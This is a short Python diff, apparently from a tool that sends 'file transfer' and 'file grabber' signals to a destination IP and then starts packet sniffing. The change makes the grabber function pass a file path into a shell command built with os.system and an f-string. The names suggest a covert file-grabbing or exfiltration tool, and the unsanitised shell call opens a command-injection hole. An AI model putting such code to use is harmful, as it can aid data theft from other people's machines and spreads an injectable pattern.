@@ -52,10 +52,10 @@ def start_file_transfer(file_path):
     os.system(f"python3 encoder.py FT:{dest_ip} {file_path}")
     print("File transfer signal sent.")
 
-def start_file_grabber():
+def start_file_grabber(file_path):
     global current_signal
     current_signal = "GRAB"
-    send_signal("GRAB")
+    os.system(f"python3 encoder.py GRAB:{dest_ip} {file_path}")
     print("File grabber signal sent.")
     start_sniffing()
     
